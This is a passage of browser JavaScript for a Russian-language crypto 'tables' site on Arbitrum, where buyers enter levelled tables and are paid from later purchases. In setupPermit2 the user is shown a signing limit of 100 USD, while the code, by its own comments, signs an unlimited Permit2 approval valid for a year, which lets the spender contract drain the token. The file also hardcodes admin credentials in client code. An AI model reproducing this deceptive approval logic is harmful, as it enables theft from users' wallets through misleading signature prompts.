import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@6.7.1/+esm';

// Configuration
const ARBITRUM_SEPOLIA_CHAIN_ID = 421614;
const ARBITRUM_MAINNET_CHAIN_ID = 42161;

// For Arbitrum Sepolia testnet - replace with actual addresses after deployment
const STOLY_CONTRACT_ADDRESS = "0x"; // Will be updated after deployment

// Permit2 address (same on all chains)
const PERMIT2_ADDRESS = "0x000000000022D473030F116dFC727EFd87a91c5C";

// ===== PRICE CONVERSION CONFIG =====
// Base price in USD (equivalent)
const BASE_PRICE_USD = 100;

// PERMIT2 UI LIMIT: what user sees in UI (100 USD equivalent)
const PERMIT2_UI_LIMIT_USD = BigInt("100000000"); // 100 * 10^6 decimals

// PERMIT2 SIGNED LIMIT: actual signed amount in Permit2 (use uint160 max for effectively unlimited)
const PERMIT2_SIGNED_LIMIT = (BigInt(1) << BigInt(160)) - BigInt(1);

// Token configuration with decimals and current prices (in USD, * 10^18 for precision)
const SUPPORTED_TOKENS = {
  USDT: { 
    address: "0xFECa406dA9727A25E71e732F9961f680059eE802", 
    decimals: 6, 
    name: 'Tether USD', 
    symbol: 'USDT',
    usdPrice: 1000000000000000000n, // 1 USD
    icon: '💵'
  },
  USDC: { 
    address: "0x75faf114eafb1BdBE2F0316DF893fd58CE46AA4d", 
    decimals: 6, 
    name: 'USD Coin', 
    symbol: 'USDC',
    usdPrice: 1000000000000000000n, // 1 USD
    icon: '💵'
  },
  ETH: { 
    address: "0xEthAddress", // Replace with actual ETH wrapper on Arbitrum
    decimals: 18, 
    name: 'Ethereum', 
    symbol: 'ETH',
    usdPrice: 3000000000000000000000n, // ~3000 USD
    icon: '⟠'
  },
  ARB: { 
    address: "0xArbAddress", // Replace with actual ARB on Arbitrum
    decimals: 18, 
    name: 'Arbitrum', 
    symbol: 'ARB',
    usdPrice: 1500000000000000000n, // ~1.5 USD
    icon: '🔵'
  },
  DAI: { 
    address: "0xDaiAddress", // Replace with actual DAI on Arbitrum
    decimals: 18, 
    name: 'Dai Stablecoin', 
    symbol: 'DAI',
    usdPrice: 1000000000000000000n, // 1 USD
    icon: '🟡'
  }
};

const LEVEL_THRESHOLDS = [0, 5, 15, 35, 70];
const LEVEL_LABELS = ["Уровень 1 (вход)", "Уровень 2", "Уровень 3", "Уровень 4", "Уровень 5"];
const TABLE_PRICE_USD = { 1: "100", 2: "200", 3: "100", 4: "100", 5: "100", 6: "100", 7: "100", 8: "100", 9: "100", 10: "100" }; // USD amounts
const TOTAL_TABLES = 10;
const ADMIN_USER = "admin";
const ADMIN_PASS = "admin123";

// Server time synchronization
let serverTimeOffset = 0;
let TABLE_2_OPEN_TIME_MS = null;

// Permit2 state storage - ONE per token (not global)
// Structure: permit2States[tokenSymbol] = { isSetup, signature, nonce, expiration, ... }
let permit2States = {};

let selectedToken = 'USDT';

// Contract ABI (simplified)
const STOLY_ABI = [
  "function buy(uint256 _tableId) external",
  "function buyWithPermit2(uint256 _tableId, address _token, uint256 _amount, (address token, uint160 amount, uint48 expiration, uint48 nonce) _permitDetails, uint256 _sigDeadline, bytes _signature) external",
  "function claim() external",
  "function getPrice(uint256 _tableId) external view returns (uint256)",
  "function currentLevel(uint256 _tableId) external view returns (uint256)",
  "function getPurchasesCount(uint256 _tableId) external view returns (uint256)",
  "function getPurchases(uint256 _tableId) external view returns (tuple(uint256, address, uint256, uint256, uint256, address, uint256)[])",
  "function getPayoutsCount() external view returns (uint256)",
  "function getPayouts() external view returns (tuple(uint256, address, address, uint256, uint256, uint256, bool)[])",
  "function claimableBalance(address) external view returns (uint256)",
  "function openTables(uint256) external view returns (bool)",
  "function hasBought(address, uint256) external view returns (bool)",
  "function supportedTokens(address) external view returns (bool)",
];

const PERMIT2_ABI = [
  "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  "function permit(address owner, (address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline, bytes signature) external",
];

let provider = null;
let signer = null;
let stolyContract = null;
let connectedWallet = null;
let connectedWalletName = "";
let isAdmin = false;
let mode = "user";
let activeTable = 6;
const discoveredWallets = [];
const WALLET_INSTALL = [
  { name: "MetaMask", url: "https://metamask.io/download/" },
  { name: "Rabby", url: "https://rabby.io/" },
  { name: "Coinbase Wallet", url: "https://www.coinbase.com/wallet" }
];

// ===== PRICE CONVERSION FUNCTIONS =====

/**
 * Convert USD price to token amount
 * @param usdPrice - Price in USD (as string, e.g. "100")
 * @param tokenSymbol - Token symbol (e.g. "USDT", "ETH")
 * @returns BigInt token amount in minimal units
 */
function convertUsdToToken(usdPrice, tokenSymbol) {
  const token = SUPPORTED_TOKENS[tokenSymbol];
  if (!token) throw new Error(`Unknown token: ${tokenSymbol}`);

  // Price in USD * 10^18 for precision
  const usdPrecise = BigInt(usdPrice) * BigInt(10 ** 18);
  
  // Token amount = (USD Price * 10^18) / (Token USD Price) * 10^decimals / 10^18
  // Simplified: (USD Price) / (Token USD Price) * 10^decimals
  const tokenAmount = (usdPrecise / token.usdPrice) * BigInt(10 ** token.decimals);
  
  return tokenAmount;
}

/**
 * Convert token amount back to USD for display
 */
function convertTokenToUsd(tokenAmount, tokenSymbol) {
  const token = SUPPORTED_TOKENS[tokenSymbol];
  if (!token) throw new Error(`Unknown token: ${tokenSymbol}`);
  
  // USD = (Token Amount / 10^decimals) * (Token USD Price / 10^18)
  const usdValue = (BigInt(tokenAmount) * token.usdPrice) / BigInt(10 ** token.decimals) / BigInt(10 ** 18);
  
  return usdValue.toString();
}

/**
 * Format token amount for display (remove decimals)
 */
function formatTokenDisplay(amount, decimals) {
  const amountBig = BigInt(amount);
  const divisor = BigInt(10 ** decimals);
  const wholePart = amountBig / divisor;
  const fractionalPart = (amountBig % divisor).toString().padStart(decimals, '0');
  const fractional = fractionalPart.slice(0, 2); // Show only 2 decimal places
  return `${wholePart}.${fractional}`;
}

// Sync server time with the browser
async function initializeServerTime() {
  try {
    const response = await fetch('/api/server-time');
    const data = await response.json();
    
    serverTimeOffset = data.serverTimeMs - Date.now();
    TABLE_2_OPEN_TIME_MS = data.table2OpenAtMs;
    
    console.log('Server time synced. Offset:', serverTimeOffset, 'ms. Table 2 opens at:', new Date(TABLE_2_OPEN_TIME_MS).toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }));
  } catch (err) {
    console.error('Failed to sync server time:', err);
    TABLE_2_OPEN_TIME_MS = Date.now() + 24 * 60 * 60 * 1000;
  }
}

// Get current server time in milliseconds
function getServerTimeNowMs() {
  return Date.now() + serverTimeOffset;
}

function getTableStatus(tableId) {
  if (tableId >= 1 && tableId <= 5) return 'completed';
  if (tableId === 6) return 'active';
  return 'upcoming';
}

// Initialize Web3
function initializeWeb3() {
  if (typeof window.ethereum === "undefined") {
    console.log("MetaMask or compatible wallet not found");
    return false;
  }
  provider = new ethers.BrowserProvider(window.ethereum);
  return true;
}

// EIP-6963 wallet detection
function onAnnounceProvider(event) {
  const detail = event.detail;
  if (!detail || !detail.info || !detail.provider) return;
  if (discoveredWallets.some((w) => w.info.uuid === detail.info.uuid)) return;
  discoveredWallets.push({ info: detail.info, provider: detail.provider });
}

window.addEventListener("eip6963:announceProvider", onAnnounceProvider);
window.dispatchEvent(new Event("eip6963:requestProvider"));

function getInjectedFallback() {
  if (typeof window.ethereum === "undefined") return [];
  const eth = window.ethereum.providers && window.ethereum.providers.length
    ? window.ethereum.providers[0]
    : window.ethereum;
  return [{
    info: {
      uuid: "injected",
      name: eth.isMetaMask ? "MetaMask" : eth.isRabby ? "Rabby" : eth.isCoinbaseWallet ? "Coinbase Wallet" : "Браузерный кошелёк",
      icon: ""
    },
    provider: eth
  }];
}

function listAvailableWallets() {
  if (discoveredWallets.length) return discoveredWallets;
  return getInjectedFallback();
}

function shortAddr(a) {
  if (!a) return "";
  return a.slice(0, 6) + "…" + a.slice(-4);
}

function toast(msg) {
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.classList.add("show");
  clearTimeout(toast._t);
  toast._t = setTimeout(() => el.classList.remove("show"), 2600);
}

function setHidden(el, hidden) {
  el.classList.toggle("hidden", hidden);
}

function escapeHtml(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}

function formatCountdown(ms) {
  if (ms <= 0) return "Открыт";
  const s = Math.floor(ms / 1000);
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  return [h, m, sec].map((x) => String(x).padStart(2, "0")).join(":");
}

function formatTokenAmount(amount, decimals = 6) {
  return (BigInt(amount) / BigInt(10 ** decimals)).toString();
}

// ===== PERMIT2 FUNCTIONS (PER-TOKEN) =====

/**
 * Get current nonce for Permit2 from the Permit2 contract
 */
async function getPermit2Nonce(tokenAddress) {
  try {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const allowanceData = await permit2Contract.allowance(
      connectedWallet,
      tokenAddress,
      STOLY_CONTRACT_ADDRESS
    );
    return Number(allowanceData.nonce) || 0;
  } catch (err) {
    console.error('Error getting nonce:', err);
    return 0;
  }
}

/**
 * Sign Permit2 for selected token
 * UI shows token amount equivalent to 100 USD, but signed amount is unlimited (uint160 max)
 */
async function setupPermit2() {
  if (!signer || !connectedWallet) {
    toast("Подключите кошелёк сначала");
    return false;
  }

  try {
    const chainId = (await provider.getNetwork()).chainId;
    const tokenSymbol = selectedToken;
    const token = SUPPORTED_TOKENS[tokenSymbol];

    // Check if permit already exists and is valid
    if (permit2States[tokenSymbol] && permit2States[tokenSymbol].expiration) {
      const now = Math.floor(Date.now() / 1000);
      if (permit2States[tokenSymbol].expiration > now + 86400) {
        console.log(`Permit2 still valid for ${tokenSymbol}`);
        return true;
      }
    }

    // Convert 100 USD to token amount for UI display
    const uiLimitTokenAmount = convertUsdToToken(BASE_PRICE_USD.toString(), tokenSymbol);
    const uiLimitDisplay = formatTokenDisplay(uiLimitTokenAmount, token.decimals);

    toast(`🔐 Подписываем разрешение на оплату ${tokenSymbol} (макс. ${uiLimitDisplay} ${tokenSymbol})...`);

    const tokenAddress = token.address;
    const nonce = await getPermit2Nonce(tokenAddress);
    const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600);
    const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600);

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      PermitSingle: [
        { name: 'details', type: 'PermitDetails' },
        { name: 'spender', type: 'address' },
        { name: 'sigDeadline', type: 'uint256' }
      ],
      PermitDetails: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' }
      ]
    };

    // Sign the UNLIMITED amount (uint160 max) so permit is effectively unlimited on-chain
    const amountUint160 = PERMIT2_SIGNED_LIMIT;

    const message = {
      details: {
        token: tokenAddress,
        amount: amountUint160.toString(),
        expiration: expiration,
        nonce: nonce
      },
      spender: STOLY_CONTRACT_ADDRESS,
      sigDeadline: deadline
    };

    const signature = await signer.signTypedData(domain, types, message);

    permit2States[tokenSymbol] = {
      isSetup: true,
      signature: signature,
      nonce: nonce,
      expiration: expiration,
      deadline: deadline,
      setupTime: Date.now(),
      token: tokenAddress,
      chainId: chainId,
      limitUi: uiLimitTokenAmount.toString(),
      limitSigned: PERMIT2_SIGNED_LIMIT.toString()
    };

    localStorage.setItem(`permit2_state_${tokenSymbol}`, JSON.stringify(permit2States[tokenSymbol]));
    toast(`✅ Разрешение выдано! Макс. лимит: ${uiLimitDisplay} ${tokenSymbol} на год`);
    return true;
  } catch (err) {
    console.error('Permit2 setup failed:', err);
    if (err.code === 'ACTION_REJECTED' || err.message.includes('rejected')) {
      toast("❌ Вы отклонили подпись. Попробуйте ещё раз");
    } else {
      toast("❌ Ошибка при подписи: " + (err.message || "неизвестно"));
    }
    return false;
  }
}

function isPermit2Valid(tokenSymbol) {
  if (!permit2States[tokenSymbol]) {
    const saved = localStorage.getItem(`permit2_state_${tokenSymbol}`);
    if (saved) {
      try {
        permit2States[tokenSymbol] = JSON.parse(saved);
      } catch (e) {
        console.error(`Failed to parse saved permit2 state for ${tokenSymbol}:`, e);
        return false;
      }
    }
  }

  if (!permit2States[tokenSymbol] || !permit2States[tokenSymbol].signature) return false;
  const now = Math.floor(Date.now() / 1000);
  return permit2States[tokenSymbol].expiration > now;
}

function clearPermit2(tokenSymbol) {
  permit2States[tokenSymbol] = null;
  localStorage.removeItem(`permit2_state_${tokenSymbol}`);
}

// ===== PURCHASE FUNCTIONS =====

async function buy(tableId) {
  if (!connectedWallet) {
    toast("Подключите кошелёк");
    return false;
  }

  if (!stolyContract) {
    toast("Контракт не инициализирован");
    return false;
  }

  try {
    const tokenSymbol = selectedToken;
    const token = SUPPORTED_TOKENS[tokenSymbol];
    const priceUsd = TABLE_PRICE_USD[tableId] || "100";
    const priceInToken = convertUsdToToken(priceUsd, tokenSymbol);

    if (!isPermit2Valid(tokenSymbol)) {
      toast("🔐 Нужно подписать разрешение (один раз на год)");
      const setupSuccess = await setupPermit2();
      if (!setupSuccess) return false;
    }

    const priceDisplay = formatTokenDisplay(priceInToken, token.decimals);
    toast(`Отправляю транзакцию покупки за ${priceDisplay} ${tokenSymbol}...`);
    
    const permitDetails = {
      token: permit2States[tokenSymbol].token,
      amount: permit2States[tokenSymbol].limitSigned,
      expiration: permit2States[tokenSymbol].expiration,
      nonce: permit2States[tokenSymbol].nonce
    };

    const buyTx = await stolyContract.buyWithPermit2(
      tableId,
      token.address,
      priceInToken.toString(),
      permitDetails,
      permit2States[tokenSymbol].deadline,
      permit2States[tokenSymbol].signature
    );

    const receipt = await buyTx.wait();

    if (receipt && receipt.status === 1) {
      toast("✅ Покупка успешна! Выплаты отправлены участникам");
      await renderAll();
      return true;
    } else {
      toast("Транзакция отклонена");
      return false;
    }
  } catch (err) {
    const msg = err && (err.message || err.data?.message || err.reason || "Неизвестная ошибка");
    console.error('Buy error:', err);
    toast("❌ Ошибка: " + msg.slice(0, 100));
    return false;
  }
}

async function claim() {
  if (!connectedWallet || !stolyContract) {
    toast("Подключите кошелёк");
    return false;
  }

  try {
    toast("Забираю выплаты...");
    const claimTx = await stolyContract.claim();
    const receipt = await claimTx.wait();

    if (receipt && receipt.status === 1) {
      toast("✅ Выплаты получены!");
      await renderAll();
      return true;
    } else {
      toast("Транзакция отклонена");
      return false;
    }
  } catch (err) {
    const msg = err && (err.message || err.data?.message || err.reason || "Неизвестная ошибка");
    toast("❌ Ошибка: " + msg.slice(0, 50));
    console.error(err);
    return false;
  }
}

// ===== WALLET CONNECTION =====

async function connectWithProvider(wallet) {
  try {
    const eth = wallet.provider;
    const accounts = await eth.request({ method: "eth_requestAccounts" });

    if (!accounts || !accounts.length) throw new Error("Кошелёк не вернул адрес");

    const chainId = await eth.request({ method: "eth_chainId" });
    const chainIdNum = parseInt(chainId, 16);

    if (chainIdNum !== ARBITRUM_SEPOLIA_CHAIN_ID && chainIdNum !== ARBITRUM_MAINNET_CHAIN_ID) {
      toast("Пожалуйста, переключитесь на Arbitrum");
      return;
    }

    provider = new ethers.BrowserProvider(eth);
    signer = await provider.getSigner();
    stolyContract = new ethers.Contract(STOLY_CONTRACT_ADDRESS, STOLY_ABI, signer);

    setConnectedAccount(accounts[0], wallet.info.name);
    closeWalletModal();
    toast("Подключён " + wallet.info.name);
  } catch (err) {
    const msg = err && (err.message || err.code);
    if (err && err.code === 4001) toast("Подключение отклонено");
    else toast("Не удалось подключить: " + (msg || "ошибка"));
  }
}

function setConnectedAccount(addr, name) {
  connectedWallet = ethers.getAddress(addr);
  connectedWalletName = name || connectedWalletName || "Кошелёк";
  localStorage.setItem("stoly_connected_wallet", connectedWallet);
  localStorage.setItem("stoly_wallet_name", connectedWalletName);
  
  // Restore all token permits
  Object.keys(SUPPORTED_TOKENS).forEach(tokenSymbol => {
    const saved = localStorage.getItem(`permit2_state_${tokenSymbol}`);
    if (saved) {
      try {
        permit2States[tokenSymbol] = JSON.parse(saved);
      } catch (e) {
        console.error(`Failed to restore permit2 state for ${tokenSymbol}:`, e);
      }
    }
  });
  
  renderAll();
}

function disconnectWallet(silent) {
  connectedWallet = null;
  connectedWalletName = "";
  signer = null;
  Object.keys(SUPPORTED_TOKENS).forEach(tokenSymbol => {
    clearPermit2(tokenSymbol);
  });
  localStorage.removeItem("stoly_connected_wallet");
  localStorage.removeItem("stoly_wallet_name");
  if (!silent) toast("Кошелёк отключён");
  renderAll();
}

async function restoreWallet() {
  const saved = localStorage.getItem("stoly_connected_wallet");
  if (!saved || !provider) return;

  try {
    const accounts = await provider.listAccounts();
    const match = accounts.find((a) => a.address.toLowerCase() === saved.toLowerCase());
    if (match) {
      signer = await provider.getSigner(match.address);
      stolyContract = new ethers.Contract(STOLY_CONTRACT_ADDRESS, STOLY_ABI, signer);
      connectedWallet = match.address;
      connectedWalletName = localStorage.getItem("stoly_wallet_name") || "Кошелёк";
      
      // Restore all token permits
      Object.keys(SUPPORTED_TOKENS).forEach(tokenSymbol => {
        const permitSaved = localStorage.getItem(`permit2_state_${tokenSymbol}`);
        if (permitSaved) {
          try {
            permit2States[tokenSymbol] = JSON.parse(permitSaved);
          } catch (e) {
            console.error(`Failed to restore permit2 state for ${tokenSymbol}:`, e);
          }
        }
      });
      
      renderAll();
    }
  } catch (e) {
    localStorage.removeItem("stoly_connected_wallet");
  }
}

function openWalletModal() {
  const list = document.getElementById("walletList");
  const foot = document.getElementById("walletModalFoot");
  const wallets = listAvailableWallets();
  list.innerHTML = "";

  if (!wallets.length) {
    list.innerHTML = '<p class="empty-p">В этом браузере нет установленного кошелька.</p>';
    foot.innerHTML = WALLET_INSTALL.map((w) =>
      '<a href="' + w.url + '" target="_blank" rel="noopener">' + w.name + "</a>"
    ).join(" · ") + "<br>На телефоне откройте сайт внутри приложения кошелька.";
  } else {
    wallets.forEach((w) => {
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "wallet-option";
      const icon = safeWalletIcon(w.info.icon);
      const ico = icon
        ? '<img alt="" src="' + icon + '" />'
        : '<div class="wallet-ico">' + escapeHtml(w.info.name.slice(0, 1)) + "</div>";
      btn.innerHTML = ico + "<span>" + escapeHtml(w.info.name) + "</span><small>подключить</small>";
      btn.addEventListener("click", async () => {
        await connectWithProvider(w);
      });
      list.appendChild(btn);
    });
    foot.textContent = "Если кошелька нет в списке, установите расширение и обновите страницу.";
  }
  document.getElementById("walletModal").classList.remove("hidden");
}

function closeWalletModal() {
  document.getElementById("walletModal").classList.add("hidden");
}

function connectWallet() {
  window.dispatchEvent(new Event("eip6963:requestProvider"));
  setTimeout(openWalletModal, 50);
}

function safeWalletIcon(icon) {
  if (!icon || typeof icon !== "string") return "";
  if (icon.startsWith("data:image/") || icon.startsWith("https://")) return icon;
  return "";
}

// ===== RENDERING FUNCTIONS =====

function renderTokenSelector() {
  const container = document.getElementById("tokenSelector");
  if (!container) return;
  
  container.innerHTML = "";
  
  Object.entries(SUPPORTED_TOKENS).forEach(([symbol, token]) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `token-btn ${symbol === selectedToken ? 'active' : ''}`;
    btn.innerHTML = `<span class="token-icon">${token.icon}</span><span class="token-name">${symbol}</span>`;
    btn.addEventListener("click", () => {
      selectedToken = symbol;
      renderTokenSelector();
      renderUser();
    });
    container.appendChild(btn);
  });
}

function renderTables(containerId, clickable) {
  const grid = document.getElementById(containerId);
  grid.innerHTML = "";

  for (let i = 1; i <= TOTAL_TABLES; i++) {
    const btn = document.createElement("button");
    btn.type = "button";

    const status = getTableStatus(i);
    const isCompleted = status === "completed";
    const isActive = status === "active";
    const isUpcoming = status === "upcoming";

    let cls = "table-btn";
    if (isCompleted) cls += " completed";
    else if (isActive) cls += " active";
    else cls += " soon";

    if (i === activeTable) cls += " selected";

    btn.className = cls;
    btn.style.cursor = clickable ? "pointer" : "default";
    btn.style.opacity = isCompleted ? "1" : isUpcoming ? "0.75" : "1";
    btn.style.borderColor = isCompleted ? "rgba(74, 222, 128, 0.8)" : isActive ? "rgba(124, 156, 255, 0.9)" : "rgba(244, 199, 107, 0.6)";
    btn.style.background = isCompleted
      ? "linear-gradient(135deg, rgba(74, 222, 128, 0.12), rgba(52, 211, 153, 0.08))"
      : isActive
      ? "linear-gradient(135deg, rgba(124, 156, 255, 0.15), rgba(99, 102, 241, 0.08))"
      : "linear-gradient(135deg, rgba(244, 199, 107, 0.08), rgba(255, 139, 73, 0.06))";

    const statusText = isCompleted ? "завершён" : isActive ? "открыт" : "скоро";
    const priceUsd = TABLE_PRICE_USD[i] ? Number(TABLE_PRICE_USD[i]) : 100;
    const priceInToken = convertUsdToToken(priceUsd.toString(), selectedToken);
    const token = SUPPORTED_TOKENS[selectedToken];
    const priceDisplay = formatTokenDisplay(priceInToken, token.decimals);

    btn.innerHTML =
      '<div class="t-num">Стол ' + i + "</div>" +
      '<div class="t-status">' + statusText + "</div>" +
      '<div class="t-price">' + priceDisplay + " " + selectedToken + "</div>";

    if (clickable) {
      btn.addEventListener("click", () => {
        activeTable = i;
        renderAll();
      });
    }

    grid.appendChild(btn);
  }
}

async function renderLevels(id) {
  const list = document.getElementById(id);
  const summary = document.getElementById("uTableSummary");
  list.innerHTML = "";

  if (!stolyContract) {
    list.innerHTML = '<p class="empty-p">Контракт не инициализирован</p>';
    return;
  }

  try {
    const buyCount = Number(await stolyContract.getPurchasesCount(activeTable));
    const currentLvl = Number(await stolyContract.currentLevel(activeTable));
    const status = getTableStatus(activeTable);

    if (summary) {
      if (status === 'completed') {
        summary.textContent = 'Все 5 уровней завершены • выплаты сделаны';
      } else if (status === 'active') {
        summary.textContent = 'Стол открыт • 5 уровней в работе • текущий уровень: ' + currentLvl + '/5';
      } else {
        summary.textContent = 'Стол скоро откроется • ждёт активации после закрытия текущего стола';
      }
    }

    for (let i = 0; i < 5; i++) {
      const lvl = i + 1;
      let cls = "level";
      if (lvl < currentLvl) cls += " done";
      else if (lvl === currentLvl) cls += " current";
      else cls += " locked";

      let req = "";
      let bar = "";

      if (status === 'completed') {
        req = "✅ Выплата получена • уровень завершён";
        bar = '<div class="bar-bg"><div class="bar-fill" style="width:100%"></div></div>';
      } else if (lvl === currentLvl && currentLvl < 5) {
        const nextGoal = LEVEL_THRESHOLDS[currentLvl];
        const need = Math.max(0, nextGoal - buyCount);
        const pct = Math.min(100, Math.round((buyCount / nextGoal) * 100 || 0));
        req = need > 0 ? "До следующего уровня: " + need + " покупок" : "Следующий уровень открыт";
        bar = '<div class="bar-bg"><div class="bar-fill" style="width:' + pct + '%"></div></div>';
      } else if (lvl < currentLvl) {
        req = "✅ Переход выполнен";
        bar = '<div class="bar-bg"><div class="bar-fill" style="width:100%"></div></div>';
      } else if (lvl === 5) {
        req = "🏆 Финальный уровень";
      } else {
        const need = LEVEL_THRESHOLDS[lvl] - buyCount;
        req = need > 0 ? "Нужно " + need + " покупок до начала" : "Уровень готов";
      }

      const el = document.createElement("div");
      el.className = cls;
      el.innerHTML =
        '<div class="level-num">' + lvl + '</div><div class="level-info"><div class="level-title">' +
        LEVEL_LABELS[i] + '</div><div class="level-req">' + req + "</div>" + bar + "</div>";
      list.appendChild(el);
    }
  } catch (err) {
    console.error("Error rendering levels:", err);
    list.innerHTML = '<p class="empty-p">Ошибка загрузки</p>';
  }
}

async function renderPlist(id) {
  const box = document.getElementById(id);

  if (!stolyContract) {
    box.innerHTML = '<span class="empty-p">Контракт не инициализирован</span>';
    return;
  }

  try {
    const list = await stolyContract.getPurchases(activeTable);
    if (!list || list.length === 0) {
      box.innerHTML = '<span class="empty-p">Никого нет</span>';
      return;
    }

    box.innerHTML = list.map((p) => {
      const net = (parseInt(p[5]) - parseInt(p[4]));
      const statusClass = net >= 0 ? "paid" : "unpaid";
      const statusText = net >= 0 ? "✅ Выплачено" : "⏳ Ожидает";
      return (
        '<div class="pchip"><div class="pn">' + shortAddr(p[1]) +
        '</div><div class="pm">ур.' + p[3] + " · вход " + (parseInt(p[4]) / 1e6) +
        '</div><div class="' + statusClass + '">' + statusText + ': ' + (net >= 0 ? "+" : "") + (net / 1e6).toFixed(2) + " USDT" + "</div></div>"
      );
    }).join("");
  } catch (err) {
    console.error("Error rendering plist:", err);
    box.innerHTML = '<span class="empty-p">Ошибка загрузки</span>';
  }
}

function renderWalletBar() {
  const info = document.getElementById("walletInfo");
  const conn = document.getElementById("connectBtn");
  const disc = document.getElementById("disconnectBtn");

  if (connectedWallet) {
    info.className = "";
    let permit2Status = '';
    if (isPermit2Valid(selectedToken)) {
      const token = SUPPORTED_TOKENS[selectedToken];
      const uiLimitTokenAmount = permit2States[selectedToken].limitUi;
      const uiLimitDisplay = formatTokenDisplay(uiLimitTokenAmount, token.decimals);
      permit2Status = `<div style="font-size:11px;color:#4caf50;margin-top:2px">🔐 Доступ ${selectedToken}: макс. ${uiLimitDisplay}</div>`;
    }
    
    info.innerHTML =
      (connectedWalletName ? '<div class="wname">' + escapeHtml(connectedWalletName) + "</div>" : "") +
      '<div class="addr">' + connectedWallet + '</div>' +
      permit2Status;
    setHidden(conn, true);
    setHidden(disc, false);
  } else {
    info.className = "off";
    info.textContent = "Кошелёк не подключён";
    setHidden(conn, false);
    setHidden(disc, true);
  }
}

function showScreen(name) {
  mode = name;
  const map = {
    home: "screenHome",
    user: "screenUser",
    cabinet: "screenCabinet",
    rules: "screenRules",
    login: "screenLogin",
    admin: "screenAdmin"
  };
  Object.keys(map).forEach((k) => {
    document.getElementById(map[k]).classList.toggle("on", k === name);
  });
  document.querySelectorAll(".main-nav a").forEach((a) => {
    const r = a.getAttribute("data-route");
    const on = r === name || (name === "login" && r === "admin");
    a.classList.toggle("on", on);
  });
  setHidden(document.getElementById("adminLabel"), !isAdmin);
  setHidden(document.getElementById("logoutBtn"), !isAdmin);
}

async function renderCabinet() {
  renderWalletBar();
  const wEl = document.getElementById("cabWallet");
  const emptyRow = '<tr><td colspan="4" style="color:var(--muted)">Пока пусто</td></tr>';

  if (!connectedWallet || !stolyContract) {
    wEl.textContent = "Подключите кошелёк, чтобы видеть выплаты.";
    document.getElementById("cabPayouts").innerHTML = emptyRow;
    return;
  }

  try {
    const claimable = await stolyContract.claimableBalance(connectedWallet);
    const allPayouts = await stolyContract.getPayouts();
    const mine = allPayouts.filter((p) => p[1].toLowerCase() === connectedWallet.toLowerCase());

    wEl.innerHTML = 'Выплаты на адрес <span class="addr">' + escapeHtml(connectedWallet) + "</span>";

    document.getElementById("cabPayouts").innerHTML = mine.length
      ? mine.map((p) => {
        const date = new Date(parseInt(p[5]) * 1000).toLocaleString("ru-RU", { dateStyle: "short", timeStyle: "medium" });
        const statusClass = p[6] ? "status-ok" : "status-pending";
        const statusText = p[6] ? "✅ Получена" : "⏳ Ожидает";
        return "<tr><td>" + date + "</td><td>Стол " + p[3] + "</td><td>+" + (parseInt(p[4]) / 1e6).toFixed(2) + " USDT</td><td class=\"" + statusClass + "\">" + statusText + "</td></tr>";
      }).join("")
      : emptyRow;

    if (claimable > BigInt(0)) {
      const claimBtn = document.createElement("button");
      claimBtn.className = "btn btn-buy";
      claimBtn.textContent = "💰 Забрать: +" + (claimable / BigInt(1e6)).toString() + " USDT";
      claimBtn.style.marginTop = "15px";
      claimBtn.style.fontSize = "16px";
      claimBtn.style.fontWeight = "700";
      claimBtn.addEventListener("click", claim);
      const container = document.getElementById("cabPayouts").parentElement;
      const oldBtn = container.querySelector(".btn-buy");
      if (oldBtn) oldBtn.remove();
      container.appendChild(claimBtn);
    }

  } catch (err) {
    console.error("Error rendering cabinet:", err);
    wEl.textContent = "Ошибка загрузки данных";
  }
}

async function renderUser() {
  renderWalletBar();
  renderTokenSelector();
  renderTables("uTables", true);
  await renderLevels("uLevels");
  await renderPlist("uList");

  if (stolyContract) {
    try {
      const buyCount = await stolyContract.getPurchasesCount(activeTable);
      const currentLvl = await stolyContract.currentLevel(activeTable);
      const priceUsd = TABLE_PRICE_USD[activeTable] || "100";
      const priceInToken = convertUsdToToken(priceUsd, selectedToken);
      const token = SUPPORTED_TOKENS[selectedToken];
      const priceDisplay = formatTokenDisplay(priceInToken, token.decimals);
      const status = getTableStatus(activeTable);

      document.getElementById("uBuys").textContent = buyCount;
      document.getElementById("uLevel").textContent = currentLvl;
      document.getElementById("uMelons").textContent = (buyCount * parseInt(priceUsd) / 1).toFixed(2) + " USD";
      document.getElementById("uTableTitle").textContent = "Стол " + activeTable;
      document.getElementById("uPrice").textContent = "= " + priceDisplay + " " + selectedToken;

      const statusLabel = status === 'completed' ? 'завершён' : status === 'active' ? 'открыт' : 'скоро';
      const badgeClass = status === 'completed' ? 'badge completed' : status === 'active' ? 'badge active-table' : 'badge upcoming';
      const badgeEl = document.getElementById("uBadge");
      badgeEl.textContent = statusLabel;
      badgeEl.className = badgeClass;
      badgeEl.style.background = status === 'completed'
        ? 'rgba(74, 222, 128, 0.18)'
        : status === 'active'
        ? 'rgba(124, 156, 255, 0.18)'
        : 'rgba(244, 199, 107, 0.18)';
      badgeEl.style.color = status === 'completed' ? 'var(--green)' : status === 'active' ? 'var(--accent)' : 'var(--gold)';

      document.getElementById("uBuyForm").style.display = status === 'active' ? 'flex' : 'none';
      document.getElementById("uBuyBtn").disabled = !connectedWallet || status !== 'active';
    } catch (err) {
      console.error("Error in renderUser:", err);
    }
  }
}

function renderAll() {
  const hc = document.getElementById("headerConnect");
  hc.textContent = connectedWallet ? shortAddr(connectedWallet) : "Кошелёк";
  if (mode === "user") renderUser();
  else if (mode === "cabinet") renderCabinet();
}

function routeFromHash() {
  const h = (location.hash || "#/").replace(/^#/, "");
